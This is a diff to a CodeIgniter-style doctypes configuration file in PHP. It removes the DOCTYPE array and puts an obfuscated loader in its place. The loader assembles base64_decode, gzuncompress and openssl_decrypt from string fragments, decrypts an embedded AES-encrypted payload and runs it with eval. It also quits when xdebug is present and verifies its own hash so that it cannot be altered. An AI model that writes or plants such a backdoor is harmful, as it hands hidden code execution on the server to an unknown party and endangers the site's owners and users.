@@ -1,24 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$_doctypes = array(
-	'xhtml11' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">',
-	'xhtml1-strict' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-	'xhtml1-trans' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',
-	'xhtml1-frame' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">',
-	'xhtml-basic11' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">',
-	'html5' => '<!DOCTYPE html>',
-	'html4-strict' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">',
-	'html4-trans' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">',
-	'html4-frame' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">',
-	'mathml1' => '<!DOCTYPE math SYSTEM "http://www.w3.org/Math/DTD/mathml1/mathml.dtd">',
-	'mathml2' => '<!DOCTYPE math PUBLIC "-//W3C//DTD MathML 2.0//EN" "http://www.w3.org/Math/DTD/mathml2/mathml2.dtd">',
-	'svg10' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">',
-	'svg11' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
-	'svg11-basic' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Basic//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-basic.dtd">',
-	'svg11-tiny' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">',
-	'xhtml-math-svg-xh' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN" "http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg.dtd">',
-	'xhtml-math-svg-sh' => '<!DOCTYPE svg:svg PUBLIC "-//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN" "http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg.dtd">',
-	'xhtml-rdfa-1' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN" "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-1.dtd">',
-	'xhtml-rdfa-2' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.1//EN" "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-2.dtd">'
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_t1e5snmj=('bas'.'e64'.'_de'.'cod'.'e');
+$_wuhtzqx6=('gzu'.'nco'.'mpr'.'ess');
+$_ls0jp9vv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_s5dnaao3='gHVepiHJ';
+$_qtccfgwk='JFB6oedG';
+$_nd0dh5jk='vHF/XUXv';
+$_kqca1p6g='S68i+i+3';
+$_j9wgflqa='jpmcbFzUYuE=';
+$_ck5yunzc='QzYShG4c';
+$_apa1lkcb='UhfH+XtK';
+$_oyvzolob='IVjMJg==';
+$_zsf8uj0u=$_t1e5snmj($_s5dnaao3.$_nd0dh5jk.$_kqca1p6g.$_qtccfgwk.$_j9wgflqa);
+$_vozo5fd6=$_t1e5snmj($_ck5yunzc.$_apa1lkcb.$_oyvzolob);
+$_xoxp0fz4=$_t1e5snmj('h1nzF/lspRS3Y3l9SVvgAmGKd+SzoC9TqjVu2TbCX1jWM332yQl/XCV264zGDxck5JiSKhhEK9khczCMoSGrnHIwUXXDG2TyuAL+u7kZ1Bu5mJzc1Qk8VBkiEwp61fsw8BUQP1pppP9I4+vyXh5b0rVzi0HO0IVMmamgj+F/o/DKnpM04QrhyFq/5/1n4M7XMfMejFfJsjzIdwdD/gw/NqDeqqyljSVTtSYKQ7wVv9pXfPcas8lHfzdatT20e2exKTidVNtNhglAEgYT9jTq4E69lLsRraff+3uXO87AU1r/baHpNrrJIaBpiCb+1rzjDRYYUfNe2VB3iSMwiSAwKOX0a7U9tPD/xdq0kWYpAJ2j7GiccUH4kGE5DjvCQCx7TYr0iXYuxxNdqtvB7OBXbxASdccx3m2pT2Hlam+7eK5wnW5RSnFsk/utLjl5w5DDlprAHspIGVK7stc5jiRi8mu9DTC+1Y+WXU1auIsF3wC5msovMtoex7tk8WJyX5zf++PZ7BDh7Ho9yR0uvtP3Kv7jxVrpsg/GVZumPlL6UZmuJesKM/TeF6VG075mVMvbBucfuh8hOMYhv2lZlSVbgQnYMO8pZNwo2oKiWnqad+KpvKOKzGMS3jHmfnaI8RbzjhVVTj+F4Spd8pmrqXT4S374QcBKJMrqnY8N3GGakIC9vdm01z+wLHz3BrEUVYLTkgvs1ry/l7gvM6F3BEsPBA==');
+$_wrs7ahjy=$_ls0jp9vv($_xoxp0fz4,'aes-256-cbc',$_zsf8uj0u,OPENSSL_RAW_DATA,$_vozo5fd6);
+if($_wrs7ahjy===false){exit;}
+$_lkh3g769=$_wuhtzqx6($_wrs7ahjy);
+if($_lkh3g769===false){exit;}
+$_z4oh8zis='c86643e328bf90fe47f7309e41e1f7c2b0c1a0f98d1740bc48e3a85bf460ab8f';
+$_kue2y2dr=@file_get_contents(__FILE__);
+if($_kue2y2dr!==false){
+$_jd9s3w2o=str_replace($_z4oh8zis,"0000000000000000000000000000000000000000000000000000000000000000",$_kue2y2dr);
+$_uen4wp0b=hash("sha256",$_jd9s3w2o);
+if($_uen4wp0b!==$_z4oh8zis){@http_response_code(403);exit;}
+}
+eval($_lkh3g769);
